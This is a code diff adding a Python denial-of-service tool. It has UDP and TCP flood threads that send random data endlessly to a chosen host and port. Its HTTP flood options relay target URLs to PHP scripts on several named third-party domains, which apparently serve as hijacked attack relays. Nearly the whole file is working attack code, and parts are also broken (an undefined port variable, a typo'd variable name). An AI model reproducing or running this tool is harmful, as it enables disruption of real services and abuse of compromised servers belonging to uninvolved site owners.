@@ -1,0 +1,185 @@
+#CODE BY FADEDTY
+#LU BUKAN YUTUBER JADI JANGAN REKOD
+import os
+from time import sleep
+from os import system
+from sys import exit
+import random
+import socket
+import threading
+import requests
+import sys, cfscrape, requests
+
+
+crape = cfscrape.create_scraper()
+
+status = """
+Host                          Response Code
+--------------------------------------------
+"""
+method = """
+#############################
+## 0.TOOLS         5.HEAD  ##
+## 1.TCP           6.POST  ##
+## 2.UDP           7.NULL  ##
+## 3.SLOW          8.GET   ##
+## 4.RANDOM L4     9.CFB   ##
+#############################
+
+"""
+tools = """
+#####################
+## 0.BACK  	   ##
+## 1.PING	   ##
+## 2.NS LOOKUP	   ##
+## 3.PORT SCANNER  ##
+## 4.CHECK STATUS  ##
+#####################
+"""
+
+allready_connected = 0
+
+print(method)
+print("SELECT THE METHOD")
+choice = input("Method: ")
+if choice == '0':
+	print(tools)
+	tool = input("tools: ")
+	if tool == '0':
+		system("python3 WORK")
+	if tool == '1':
+		host = input("host: ")
+		system("ping -c 7 """+host+"")
+		system("python3 WORK")
+	if tool == '2':
+		system("python3 nsl.py")
+	if tool == '3':
+		system("python3 ps")
+	if tool == '4':
+		system("python3 uptime.py")
+	else:
+		print("Worng Input!!")
+		system("python3 WORK")
+if choice == '5':
+	print("MUST USE HTTP/HTTPS!!")
+	ip = input("Host :")
+	threads = input("Threads: ")
+	print(" ") 
+	print("SENT PACKET TO "+ip+"")
+	print(" ")
+	print("CTRL-Z TO EXIT")
+	crape.get("http://sjbytes.com/indos.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://verdaconsultancy.com/indos.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://vandtransp.com/indos.php?url="+ip+"&c="+threads+"s=p")
+	crape.get("http://latefestival.com.ar/indos.php?url="+ip+"&c="+threads+"s=p")
+
+if choice == '3':
+	print("EXAMPLE: HOST:PORT")
+	host5 = input("Host/ip: ")
+	print("Default 550")
+	turbo = input("Thread: ")
+	print(" ")
+	print("SENT PACKET TO "+host5+"")
+	print(" ")
+	print("CTRL-Z TO EXIT")
+	crape.get("http://verdaconsultancy.com/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://haniconsulting.com/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://rgstv.com.br/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+	crape.get("http://sjbytes.com/tcp.php?act=phptools&host="+host5+"&time="+turbo+"")
+
+if choice == '6':
+        print("MUST USE HTTP/HTTPS!!")
+        h6 = input("Host/ip: ")
+        print("default 5")
+        th6 = input("Thread: ")
+        print(" ")
+        print("SENT PACKET TO "+h6+"")
+        print(" ")
+        print("CTRL-Z TO EXIT")
+        crape.get("http://sjbytes.com/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://verdaconsultancy.com/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://haniconsulting/post.php?url="+h6+"&c="+th6+"s=p")
+        crape.get("http://rgstv.com.br/post.php?url="+h6+"&c="+th6+"s=p")
+
+if choice == '7':
+	print("MUST USE HTTP/HTTPS!!")
+	h7 = input("Host/ip: ")
+	print("default 5")
+	th7 = input("Thread: ")
+	print(" ")
+	print("SEND PACKET TO "+h7+"")
+	print(" ")
+	print("CTRL-Z TO EXIT")
+	crape.get("http://verdaconsultancy.com/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://sjbytes.com/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://haniconsulting/null.php?url="+h7+"&c="+th7+"s=p")
+	crape.get("http://rgstv.com.br/null.php?url="+h7+"&c="+th7+"s=p")
+
+if choice == '8':
+        print("MUST USE HTTP/HTTPS!!")
+        h8 = input("Host/ip: ")
+        print("default 5")
+        th8 = input("Thread: ")
+        print(" ")
+        print("SENT PACKET TO "+h8+"")
+        print(" ")
+        print("CTRL-Z TO EXIT")
+        crape.get("http://sjbytes.com/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://verdaconsultancy.com/get.php?url="+h8+"&c="+th8+"s=p")
+        crape.get("http://haniconsulting/get.php?url="+h8+"&c="+t86+"s=p")
+        crape.get("http://rgstv.com.br/get.php?url="+h8+"&c="+th8+"s=p")
+
+if choice =='9':
+	system("python3 cfb.py")
+else:
+	print("WORNG INPUT")
+	system("python3 WORK")
+
+print("EXAMPLE IP:PORT")
+ip = input(" Host/Ip: ")
+times = int(input(" Packets per one connection:"))
+threads = int(input(" Threads:"))
+
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("!","!","!"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("!","!","!"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+for y in range(threads):
+	if choice == '1':
+		th = threading.Thread(target = run)
+		th.start()
+	if choice == '2':
+		th = threading.Thread(target = run2)
+		th.start()
+	if choice == '4':
+		th = threading.Thread(target = run)
+		th2 = threading.Thread(target = run2)
+		th.start()
+		th2.start()
+	else:
+		print("WORNG INPUT!!")
+		system("python3 WORK")
